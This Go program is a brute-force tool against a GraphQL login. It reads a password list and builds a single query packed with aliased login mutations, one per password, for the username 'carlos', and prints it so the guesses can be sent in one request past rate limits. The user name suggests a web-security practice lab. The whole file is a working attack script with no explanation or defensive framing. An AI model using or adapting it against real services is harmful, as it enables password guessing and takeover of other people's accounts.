package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
)

func main() {
	// Open the passwords file
	file, err := os.Open("passwords.txt")
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	// Read the passwords from the file
	scanner := bufio.NewScanner(file)
	var passwords []string
	for scanner.Scan() {
		passwords = append(passwords, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	// Construct the GraphQL queries
	var queries strings.Builder
	for index, password := range passwords {
		query := fmt.Sprintf(`
bruteforce%d:login(input:{password: "%s", username: "carlos"}) {
        token
        success
    }
`, index, password)
		queries.WriteString(query)
	}

	// Print the constructed queries
	fmt.Println(queries.String())
}
